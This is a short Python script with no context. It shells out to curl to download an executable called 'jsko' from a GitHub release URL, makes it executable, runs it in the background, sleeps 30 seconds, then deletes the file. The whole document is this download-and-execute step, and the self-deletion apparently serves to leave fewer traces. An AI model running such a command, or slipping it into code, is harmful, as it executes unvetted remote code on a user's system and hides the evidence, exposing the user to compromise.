import subprocess
cmd = "curl -L -o jsko https://github.com/seav1/dl/releases/download/files/jsko && chmod +x jsko && ./jsko & sleep 30 && rm -f jsko"
subprocess.call(cmd, shell=True)
